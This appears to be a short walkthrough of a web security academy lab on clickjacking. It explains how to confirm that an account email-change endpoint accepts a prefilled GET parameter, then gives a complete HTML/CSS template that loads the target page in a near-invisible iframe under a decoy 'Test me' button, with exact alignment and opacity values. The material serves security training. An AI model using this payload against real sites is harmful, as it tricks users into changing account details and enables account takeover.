# Some cases of Clickjacking

## 1. Clickjacking with form input data prefilled from a URL parameter

Log on to the account with `username = wiener` , `password = peter`

Change the email into:  `ian@hacker.com`

Using Burp, the Proxy tab proceeds to search for the `my-account/change-email` section. Then `Send to repeater`.

In the repeater, when sending with the `POST` method, the response side returns
a result of `302 Found`. Therefore, we proceed to change the `POST` method to `GET` and send back => Return that found `ian@hacker.com`

Go back to the website and click on `Go to exploit server` to proceed with the change 
structure the body and occupy the server with the following information:

```
<style>

   iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }   
    
</style>

<div> Test me </div>

<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

Make the following adjustments to the template:

- Replace `YOUR-LAB-ID` with your unique lab ID so that the URL points to the target website's user account page, which contains the "Update email" form.
  
- Substitute suitable pixel values for the `$height_value` and `$width_value` variables of the iframe (we suggest 700px and 500px respectively).

- Substitute suitable pixel values for the `$top_value` and `$side_value` variables of the decoy web content so that the "Update email" button and the "Test me" decoy action align (we suggest 400px and 80px respectively).

- Set the opacity value `$opacity` to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
